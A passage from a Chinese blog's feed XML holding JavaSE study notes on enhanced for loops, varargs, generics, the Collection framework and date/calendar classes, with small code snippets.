    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——增强for循环、JDK5新特性与可变参数/</id>
    <published>2019-04-10T01:54:58.000Z</published>
    <updated>2019-04-10T02:04:55.964Z</updated>
    
    <content type="html"><![CDATA[<h1 id="增强for循环的概述"><a href="#增强for循环的概述" class="headerlink" title="增强for循环的概述"></a>增强for循环的概述</h1><blockquote><p>简化数值与集合的遍历，不需要那么麻烦了，它的底层依赖的是<code>iterator迭代器</code>。</p></blockquote><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">for</span><span class="params">(创建一个临时变量储存数据：需要遍历的数组或者集合)</span></span> &#123;</span><br><span class="line">在这里使用那个临时变量就好了。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>eclipse可以直接输入fore然后按提示快捷键</p><p>ps：只要可以用迭代器迭代，那么就可以用增强for循环。</p><a id="more"></a><h1 id="JDK5新特性"><a href="#JDK5新特性" class="headerlink" title="JDK5新特性"></a>JDK5新特性</h1><blockquote><p>可以导入类里的<code>静态方法</code>，不过意义不大，开发不用，但是要看得懂。</p></blockquote><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> 包名.类名.方法名</span><br></pre></td></tr></table></figure><h1 id="可变参数的概述"><a href="#可变参数的概述" class="headerlink" title="可变参数的概述"></a>可变参数的概述</h1><blockquote><p>定义方法的时候<code>不知道该定义多少个参数</code>,我们就可以用到可变参数</p></blockquote><h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="literal">void</span> a(数据类型 <span class="params">...</span> 变量名)</span><br></pre></td></tr></table></figure><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><blockquote><p>1、这里的变量其实底层是一个<code>数组</code></p><p>2、如果一个方法里有多个参数，那么可变参数<code>一定要放在最后面</code></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;增强for循环的概述&quot;&gt;&lt;a href=&quot;#增强for循环的概述&quot; class=&quot;headerlink&quot; title=&quot;增强for循环的概述&quot;&gt;&lt;/a&gt;增强for循环的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;简化数值与集合的遍历，不需要那么麻烦了，它的底层依赖的是&lt;code&gt;iterator迭代器&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;使用方法：&quot;&gt;&lt;a href=&quot;#使用方法：&quot; class=&quot;headerlink&quot; title=&quot;使用方法：&quot;&gt;&lt;/a&gt;使用方法：&lt;/h3&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(创建一个临时变量储存数据：需要遍历的数组或者集合)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	在这里使用那个临时变量就好了。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;eclipse可以直接输入fore然后按提示快捷键&lt;/p&gt;
&lt;p&gt;ps：只要可以用迭代器迭代，那么就可以用增强for循环。&lt;/p&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="增强for循环" scheme="http://liuhaoan.github.io/tags/%E5%A2%9E%E5%BC%BAfor%E5%BE%AA%E7%8E%AF/"/>
    
      <category term="JDK5新特性" scheme="http://liuhaoan.github.io/tags/JDK5%E6%96%B0%E7%89%B9%E6%80%A7/"/>
    
      <category term="可变参数" scheme="http://liuhaoan.github.io/tags/%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0/"/>
    
      <category term="静态导入" scheme="http://liuhaoan.github.io/tags/%E9%9D%99%E6%80%81%E5%AF%BC%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——泛型</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E6%B3%9B%E5%9E%8B/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——泛型/</id>
    <published>2019-04-10T01:18:54.000Z</published>
    <updated>2019-04-10T03:16:05.856Z</updated>
    
    <content type="html"><![CDATA[<h1 id="泛型的概述"><a href="#泛型的概述" class="headerlink" title="泛型的概述"></a>泛型的概述</h1><blockquote><p>可以把泛型理解成<code>“参数化类型”</code>，他可以在类、接口和方法中使用，分别被称为<code>泛型类、泛型接口、泛型方法</code>。</p></blockquote><h3 id="泛型类的使用"><a href="#泛型类的使用" class="headerlink" title="泛型类的使用"></a>泛型类的使用</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Collection<span class="tag">&lt;<span class="name">泛型</span>&gt;</span> =  new Collection<span class="tag">&lt;&gt;</span>();</span><br></pre></td></tr></table></figure><ul><li>定义方法的作用<blockquote><p>指定自己需要使用的数据类型。</p></blockquote></li></ul><a id="more"></a><h3 id="泛型接口的定义："><a href="#泛型接口的定义：" class="headerlink" title="泛型接口的定义："></a>泛型接口的定义：</h3><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Inter</span>&lt;E&gt; </span>&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="泛型类的定义与接口的实现"><a href="#泛型类的定义与接口的实现" class="headerlink" title="泛型类的定义与接口的实现"></a>泛型类的定义与接口的实现</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">press</span>&lt;E&gt; <span class="title">implements</span> <span class="title">Inter</span>&lt;String&gt; &#123; &#125;</span></span><br><span class="line">/<span class="regexp">/在这个类中用E代替传入的数据类型即可</span></span><br></pre></td></tr></table></figure><ul><li>定义类的作用：<blockquote><p>在创建这个类的引用或者对象时，可以自己指定数据类型。ArrayList这个类就是这样定义的。</p></blockquote></li></ul><h3 id="泛型类中方法使用定义好的泛型"><a href="#泛型类中方法使用定义好的泛型" class="headerlink" title="泛型类中方法使用定义好的泛型"></a>泛型类中方法使用<code>定义好</code>的泛型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">aa</span><span class="params">()</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ps：在创建这个泛型类的时候就把这个E给赋值了，赋的值时自己定义的数据类型，可以在方法中直接使用E，当然这个E可以定义成其他的符号。</p></blockquote><h3 id="泛型方法的定义"><a href="#泛型方法的定义" class="headerlink" title="泛型方法的定义"></a>泛型方法的定义</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span>&lt;T&gt; <span class="title">aaa</span>(<span class="params"></span>)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>作用：</p><p>让类中的某个方法有自己的泛型。</p></blockquote><ul><li>注意事项：<blockquote><p>1、在定义了泛型的类中最好不要定义某个<code>方法特有的泛型</code><br>2、<code>静态方法</code>因为在类的加载就加载了，所以不能使用类的泛型，<code>只能声明自己的泛型</code>。</p></blockquote></li></ul><p>ps：可以把泛型看作一个变量来理解。</p><h3 id="泛型定义示例"><a href="#泛型定义示例" class="headerlink" title="泛型定义示例"></a>泛型定义示例</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String ages[])</span> </span>&#123;</span><br><span class="line">person&lt;String&gt; p =<span class="keyword">new</span> person&lt;String&gt;();</span><br><span class="line"><span class="comment">//创建完之后，E就等于String了</span></span><br><span class="line"></span><br><span class="line">p.b(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//调用后b这个方法中T的类型就等于Boolean了</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span>&lt;E&gt; &#123;</span></span><br><span class="line"><span class="keyword">private</span> E a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>&lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">b</span><span class="params">(T tt)</span> </span>&#123;</span><br><span class="line">E s;</span><br><span class="line">System.out.println(tt);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="泛型作用"><a href="#泛型作用" class="headerlink" title="泛型作用"></a>泛型作用</h3><blockquote><p>限制某个集合只能存什么类型的数据,<code>防止出现数据的安全隐患</code>。</p></blockquote><h3 id="泛型的好处："><a href="#泛型的好处：" class="headerlink" title="泛型的好处："></a>泛型的好处：</h3><blockquote><p>1、提高了<code>安全性</code>（因为能限制只能存什么数据，所以把<code>运行期</code>的错误转移到了<code>编译期</code>）</p><p>2、省去了数据需要从Object强转的麻烦</p></blockquote><h3 id="泛型的注意事项"><a href="#泛型的注意事项" class="headerlink" title="泛型的注意事项"></a>泛型的注意事项</h3><blockquote><p>1、泛型的数据类型一定要时<code>引用数据类型</code>。</p><p>2、不要把泛型数据类型定义成<code>Object</code>，因为没有任何意义。</p></blockquote><h3 id="jdk1-7版本新特性：菱形泛型"><a href="#jdk1-7版本新特性：菱形泛型" class="headerlink" title="jdk1.7版本新特性：菱形泛型"></a>jdk1.7版本新特性：<code>菱形泛型</code></h3><blockquote><p>解析：创建对象时，<code>等号前面</code>&lt;&gt;里写了泛型，那么后面&lt;&gt;里可以不写数据类型，因为两个尖括号放一起很想菱形，所以叫做<code>菱形泛型</code>。</p></blockquote><h3 id="泛型高级之——通配符？"><a href="#泛型高级之——通配符？" class="headerlink" title="泛型高级之——通配符？"></a>泛型高级之——通配符？</h3><ul><li><p>&lt;?&gt;</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ArrayList<span class="php"><span class="meta">&lt;?</span>&gt; a = <span class="keyword">new</span> ArrayList&lt;&gt;();</span></span><br></pre></td></tr></table></figure><blockquote><p>当我们遇到<code>右边</code>返回对象时，这时我们不知道返回对象的泛型(类型)是什么，那么我们左边就可以用通配符”?”来替代。</p></blockquote></li><li><p>&lt;？ extends E&gt;</p><blockquote><p>向下限定，表示只能传入E<code>或者它的子类</code>。</p></blockquote></li></ul><h1 id="泛型的边界定义"><a href="#泛型的边界定义" class="headerlink" title="泛型的边界定义"></a>泛型的边界定义</h1><ul><li><p>&lt;？ extends E&gt;：</p><blockquote><p>泛型固定上边界，向下限定，表示只能传入E或者它的子类。</p></blockquote></li><li><p>&lt;? super E&gt;:</p><blockquote><p>泛型固定下边界，向上限定，表示只能传入E或者它的父类</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;泛型的概述&quot;&gt;&lt;a href=&quot;#泛型的概述&quot; class=&quot;headerlink&quot; title=&quot;泛型的概述&quot;&gt;&lt;/a&gt;泛型的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;可以把泛型理解成&lt;code&gt;“参数化类型”&lt;/code&gt;，他可以在类、接口和方法中使用，分别被称为&lt;code&gt;泛型类、泛型接口、泛型方法&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;泛型类的使用&quot;&gt;&lt;a href=&quot;#泛型类的使用&quot; class=&quot;headerlink&quot; title=&quot;泛型类的使用&quot;&gt;&lt;/a&gt;泛型类的使用&lt;/h3&gt;&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Collection&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;泛型&lt;/span&gt;&amp;gt;&lt;/span&gt; =  new Collection&lt;span class=&quot;tag&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;定义方法的作用&lt;blockquote&gt;
&lt;p&gt;指定自己需要使用的数据类型。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="泛型" scheme="http://liuhaoan.github.io/tags/%E6%B3%9B%E5%9E%8B/"/>
    
      <category term="泛型边界定义" scheme="http://liuhaoan.github.io/tags/%E6%B3%9B%E5%9E%8B%E8%BE%B9%E7%95%8C%E5%AE%9A%E4%B9%89/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Collection集合框架</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Collection%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Collection集合框架/</id>
    <published>2019-04-09T12:54:50.000Z</published>
    <updated>2019-04-09T13:31:54.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="集合与数值的区别"><a href="#集合与数值的区别" class="headerlink" title="集合与数值的区别"></a>集合与数值的区别</h1><blockquote><p>1、数组即可以存<code>基本数据类型</code>也可以存<code>引用数据类型</code>(对象)</p><p>2、集合只能存<code>引用数据类型</code>，如果存基本数据类型，那么系统会<code>自动装箱成对象</code>。</p><p>3、数组的长度是<code>固定</code>的，不能自动增长</p><p>4、集合的长度是<code>可变</code>的。</p></blockquote><a id="more"></a><h1 id="集合与数组的缺点"><a href="#集合与数组的缺点" class="headerlink" title="集合与数组的缺点"></a>集合与数组的缺点</h1><ul><li>数组：<blockquote><p>长度是固定的，不能自动增加</p></blockquote></li><li>集合：<blockquote><p>会浪费很多空间，</p><p>原因：它的部分底层是数组，它增加长度的方法是首先创建长度为10的数组，然后不够就1.5倍增加，直到够存下为止。</p></blockquote></li></ul><h1 id="Collection集合的继承体系图"><a href="#Collection集合的继承体系图" class="headerlink" title="Collection集合的继承体系图:"></a>Collection集合的继承体系图:</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">                                             Collection</span><br><span class="line">                          单列集合的根接口,它是抽象类，一般用来父类引用子类对象</span><br><span class="line">                           /                                   <span class="string">\</span></span><br><span class="line">                          /                                     <span class="string">\</span>   </span><br><span class="line">                         /                                       <span class="string">\</span></span><br><span class="line">                       List                                      Set</span><br><span class="line">               有序，有索引，可重复储存                    无序，无索引，不可重复储存（我们只要学习如何保证元素不是重复的）</span><br><span class="line">                /        |        <span class="string">\</span>                         /          <span class="string">\</span></span><br><span class="line">               /         |         <span class="string">\</span>                       /            <span class="string">\</span></span><br><span class="line">              /          |          <span class="string">\</span>                     /              <span class="string">\</span></span><br><span class="line">     ArrayList       LinkedList      Vector              HashSet          TreeSet</span><br><span class="line"> 查改快(直接索引查找)  查改慢(要遍历)    查改略慢               </span><br><span class="line">增删慢(考虑增容、拷贝)   增删快          增删慢</span><br><span class="line">      线程不安全       线程安全        线程安全</span><br><span class="line">      数组实现         链表实现        数组实现</span><br></pre></td></tr></table></figure><h1 id="Collection集合的方法"><a href="#Collection集合的方法" class="headerlink" title="Collection集合的方法"></a>Collection集合的方法</h1><ul><li>.add()<blockquote><p>向集合中存入数据，list集合返回true，Set集合如果集合有相同的数据返回false，否则true。</p></blockquote></li><li>.remove()<blockquote><p>删除</p></blockquote></li><li>.toArray()<blockquote><p>把集合转换成数组输出，如果ArrayList对象加了泛型，那么可以传入某类型数组对象，然后用某类型数组直接引用。</p></blockquote></li><li>.addAll()<blockquote><p>把传入集合加入到调用的集合中</p></blockquote></li><li>.removeAll()<blockquote><p>删除调用集合中与传入集合交集的数据</p></blockquote></li><li>.containsAll()<blockquote><p>判断调用集合中是否有传入集合的数据</p></blockquote></li><li>.retainAll()<blockquote><p>取两个集合的交集，如果传入类有交集那么会把那两个值覆盖调用集合的值，调用的集合改变了就返回true，否则false</p></blockquote></li></ul><h1 id="List集合方法："><a href="#List集合方法：" class="headerlink" title="List集合方法："></a>List集合方法：</h1><ul><li>.add(int index,)<blockquote><p>在某个索引添加指定数据</p></blockquote></li><li>.remove(int index,)<blockquote><p>在某个索引删除指定数据，删除了什么就返回什么。一个小问题：remove不会自动装箱，可能会识别错误导致程序出错</p></blockquote></li><li>.get(int index,)<blockquote><p>输出索引对应的数据，所以list可以直接用这个方法遍历数组，不用迭代了。    </p></blockquote></li><li>.set(int index,)<blockquote><p>设置指定索引的数据</p></blockquote></li></ul><p>ps：集合<code>containsAll、removeAll</code>等方法底层都是基于<code>equals</code>方法的，所以在集合中处理对象时，<code>传入对象</code>需要重写object父类的equals方法才能实现效果。</p><h1 id="集合迭代的概述："><a href="#集合迭代的概述：" class="headerlink" title="集合迭代的概述："></a>集合迭代的概述：</h1><blockquote><p>集合是存储元素，而这些元素需要查看，那么就需要用到迭代，迭代也就是遍历。</p></blockquote><h3 id="迭代使用示例："><a href="#迭代使用示例：" class="headerlink" title="迭代使用示例："></a>迭代使用示例：</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Collection c = <span class="keyword">new</span> ArrayList();</span><br><span class="line">Iterator it = c.iterator();</span><br><span class="line"></span><br><span class="line"><span class="comment">//.hasNext()判断是否还有数据</span></span><br><span class="line"><span class="keyword">While</span>(it.hasNext())</span><br><span class="line">&#123;</span><br><span class="line">System.out.<span class="keyword">println</span>(it.<span class="keyword">next</span>());</span><br><span class="line"><span class="comment">//.next()获取下一个数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="迭代器修改数据产生的异常与解决方案："><a href="#迭代器修改数据产生的异常与解决方案：" class="headerlink" title="迭代器修改数据产生的异常与解决方案："></a>迭代器<code>修改数据</code>产生的异常与解决方案：</h3><ul><li>异常：<blockquote><p>在利用迭代器遍历数据时，如果我们在遍历的中途给集合添加数据，那么会出现异常</p></blockquote></li><li>异常原因：<blockquote><p>在创建iterator迭代器时已经把集合的数量给了迭代器，如果中途给集合添加数据就是并发修改了。</p></blockquote></li><li>解决方法：<blockquote><p>使用iterator这个<code>list独有</code>的迭代器，然后调用<code>Itterator自己</code>的add添加数据。 </p></blockquote></li></ul><h1 id="Vector的概述"><a href="#Vector的概述" class="headerlink" title="Vector的概述"></a>Vector的概述</h1><blockquote><p>jdk刚出来他就有了，在<code>jdk1.2</code>版本加入了collection体系，后来因为vector有的功能ArrayList都有，而且还比他强大，所以不用vector了。</p></blockquote><h3 id="Vector与ArrayList的区别"><a href="#Vector与ArrayList的区别" class="headerlink" title="Vector与ArrayList的区别"></a>Vector与ArrayList的区别</h3><blockquote><p>Vector是<code>线程安全</code>的，它的<code>效率相对低</code>也就是查询相对慢；</p><p>反之ArrayList它是<code>线程不安全</code>的，但是<code>效率高</code>。</p></blockquote><h1 id="LinkedList集合的概述"><a href="#LinkedList集合的概述" class="headerlink" title="LinkedList集合的概述"></a>LinkedList集合的概述</h1><blockquote><p>使用链表实现的list集合。</p></blockquote><h3 id="数组实现集合与链表实现集合的优缺点："><a href="#数组实现集合与链表实现集合的优缺点：" class="headerlink" title="数组实现集合与链表实现集合的优缺点："></a><code>数组</code>实现集合与<code>链表</code>实现集合的优缺点：</h3><ul><li>数组：<blockquote><p>查询修改快，但是增删慢</p></blockquote></li><li>链表：<blockquote><p>查询修改慢，但是增删快</p></blockquote></li></ul><h1 id="集合的面试题——之ArrayList、Vector、linkedList区别："><a href="#集合的面试题——之ArrayList、Vector、linkedList区别：" class="headerlink" title="集合的面试题——之ArrayList、Vector、linkedList区别："></a>集合的面试题——之ArrayList、Vector、linkedList区别：</h1><ul><li>ArrayList：<blockquote><p>数组实现，查询修改快，但是增删慢，它是线程不安全的。</p></blockquote></li><li>LinkedList：<blockquote><p>链表实现，查询修改慢，但是增删快，它是线程不安全的。</p></blockquote></li><li>Vector：<blockquote><p>数组实现，相对ArrayList查询慢效率低，因为它是线程安全的。</p></blockquote></li></ul><h3 id="他们三个的用法："><a href="#他们三个的用法：" class="headerlink" title="他们三个的用法："></a>他们三个的用法：</h3><blockquote><p>1、查询多用ArrayList<br>2、增删多用LinkedList<br>3、增删查询都多用ArrayList<br>4、Vector面试的时候用，虽然它是线程安全的，但是在需要线程安全的时候也不用它。</p></blockquote><h3 id="LinkedList的特殊方法"><a href="#LinkedList的特殊方法" class="headerlink" title="LinkedList的特殊方法"></a>LinkedList的特殊方法</h3><ul><li>.addFirst()  与  .addLast()<blockquote><p>在链表头部与尾部添加数据</p></blockquote></li><li>.getFirst  与  .getLast()<blockquote><p>获取链表头部或者尾部数据</p></blockquote></li><li>.removeFirst  与  .removeLast()<blockquote><p>删除链表头部或者尾部数据</p></blockquote></li><li>.get()    <blockquote><p>获取链表指定位置的数据</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;集合与数值的区别&quot;&gt;&lt;a href=&quot;#集合与数值的区别&quot; class=&quot;headerlink&quot; title=&quot;集合与数值的区别&quot;&gt;&lt;/a&gt;集合与数值的区别&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;1、数组即可以存&lt;code&gt;基本数据类型&lt;/code&gt;也可以存&lt;code&gt;引用数据类型&lt;/code&gt;(对象)&lt;/p&gt;
&lt;p&gt;2、集合只能存&lt;code&gt;引用数据类型&lt;/code&gt;，如果存基本数据类型，那么系统会&lt;code&gt;自动装箱成对象&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;3、数组的长度是&lt;code&gt;固定&lt;/code&gt;的，不能自动增长&lt;/p&gt;
&lt;p&gt;4、集合的长度是&lt;code&gt;可变&lt;/code&gt;的。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="Collection集合" scheme="http://liuhaoan.github.io/tags/Collection%E9%9B%86%E5%90%88/"/>
    
      <category term="集合" scheme="http://liuhaoan.github.io/tags/%E9%9B%86%E5%90%88/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Date、SimpDateFormat、Calendar类</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Date%E3%80%81SimpDateFormat%E3%80%81Calendar%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Date、SimpDateFormat、Calendar类/</id>
    <published>2019-04-09T12:41:36.000Z</published>
    <updated>2019-04-09T12:52:42.961Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Date的概述"><a href="#Date的概述" class="headerlink" title="Date的概述"></a>Date的概述</h1><blockquote><p>获取瞬间时间，精确到毫秒。</p></blockquote><ul><li>例子：</li></ul><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Date</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="comment">//打印d会显示打印时瞬间的电脑系统时间</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Date</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">0</span>)</span><br><span class="line"><span class="comment">//这样会打印1970年1月1日的8点</span></span><br></pre></td></tr></table></figure><a id="more"></a><ul><li>解析：<blockquote><p>1、为什么是1970年1月1日：<br>首先1970年1月1日是<code>c语言</code>和<code>UNLX</code>的生日，然后因为最早的计算机是32位的，<code>32位最多表示的时间是68年</code>，而最早出现的UNLX系统考虑到计算机产生的年代和应用的时限，所以综合取了<code>1970年1月1日</code>为UNLX 的纪元时间开始。</p><p>2、为什么是8点：<br>因为我们电脑的时区是东8区，所以显示的是8点。</p></blockquote></li></ul><h3 id="Date的方法"><a href="#Date的方法" class="headerlink" title="Date的方法"></a>Date的方法</h3><ul><li>.getTime()    <blockquote><p>通过时间对象获取毫秒值</p></blockquote></li><li>.setTime()    <blockquote><p>设置毫秒值，设置1000那么输出时间对象的时间为：<code>1970年1月1日8点钟多一秒</code>。</p></blockquote></li></ul><h1 id="SimpDateFormat的概述"><a href="#SimpDateFormat的概述" class="headerlink" title="SimpDateFormat的概述"></a>SimpDateFormat的概述</h1><blockquote><p>1、它是<code>DateFormat</code>的子类，拥有DateFormat的所有功能。</p><p>2、DateFormat 是日期/时间格式化子类的抽象类</p><p>3、SimpleDateFormat 是一个以与<code>语言环境</code>有关的方式来<code>格式化</code>和<code>解析日期</code>的具体类。它允许进行格式化<code>（日期 -&gt; 文本）</code>、解析<code>（文本 -&gt; 日期）</code>和规范化。<br>总的来说，它们就是一个<code>日期格式化类</code>，构造方法传入格式规则可以按照相应的规则格式化日期。</p></blockquote><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ul><li>.format(Date d)<blockquote><p>把日期类转换为String类</p></blockquote></li><li>.parse(String str)<blockquote><p>把时间字符串转换成日期对象，需要配合异常使用。</p></blockquote></li></ul><h3 id="SimpleDateFormat类的实例"><a href="#SimpleDateFormat类的实例" class="headerlink" title="SimpleDateFormat类的实例"></a>SimpleDateFormat类的实例</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Date</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//获取当前瞬间时间</span></span><br><span class="line"></span><br><span class="line">SimpleDateFormat sdf = <span class="keyword">new</span> <span class="built_in">SimpleDateFormat</span>(<span class="string">"yyyy年MM月dd日 HH:mm:ss"</span>);</span><br><span class="line"><span class="comment">//创建日期格式化类并且进行格式化</span></span><br><span class="line"></span><br><span class="line">System.out.<span class="built_in">println</span>(sdf.<span class="keyword">format</span>(d));</span><br><span class="line"><span class="comment">//格式化并且输出时间，结果为：1970年</span></span><br></pre></td></tr></table></figure><h1 id="Calendar类的概述"><a href="#Calendar类的概述" class="headerlink" title="Calendar类的概述"></a>Calendar类的概述</h1><blockquote><p>它把K的很多方法都替代掉了，Calendar 类是一个抽象类，它为特定瞬间与一组诸如 <code>YEAR、MONTH、DAY_OF_MONTH、HOUR 等</code> 日历字段之间的转换提供了一些方法，并为操作日历字段（例如获得下星期的日期）提供了一些方法。</p></blockquote><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><ul><li>.getInstance()    <blockquote><p>获得一个日历，并且是基于当前时间的，返回一个Calendar的子类，可以父类引用子类对象</p></blockquote></li><li>.get(int 